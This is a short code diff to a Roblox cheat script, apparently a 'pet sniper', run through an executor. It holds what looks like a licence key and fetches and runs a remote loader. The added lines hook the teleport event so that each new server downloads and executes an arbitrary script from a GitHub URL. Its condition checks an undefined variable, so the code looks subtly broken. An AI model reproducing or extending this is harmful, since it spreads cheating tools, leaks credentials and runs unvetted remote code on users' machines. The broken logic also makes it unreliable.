@@ -1,3 +1,6 @@
+queueteleport =  queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+local Players = game:GetService("Players")
+
 getgenv().pet_sniper_config = {
     search_mode = "rarity", -- "rarity" or "name"
 
@@ -27,3 +30,17 @@ getgenv().pet_sniper_config = {
 }
 script_key="fhKdxsdyFUgncoecIteaVVTvYCTXzSGY";
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c24e31186beff7519651ada26f5ad7bb.lua"))()
+
+local Keep =  true
+local TeleportCheck = false
+
+Players.LocalPlayer.OnTeleport:Connect(function(State)
+	if KeepInfYield and not TeleportCheck and queue_on_teleport then
+		TeleportCheck = true
+
+		local scriptUrl = "https://raw.githubusercontent.com/startgoogle/cool/refs/heads/main/terst.lua"
+		local queuedCode = 'loadstring(game:HttpGet("' .. scriptUrl .. '"))()'
+
+		queueteleport(queuedCode)
+	end
+end)
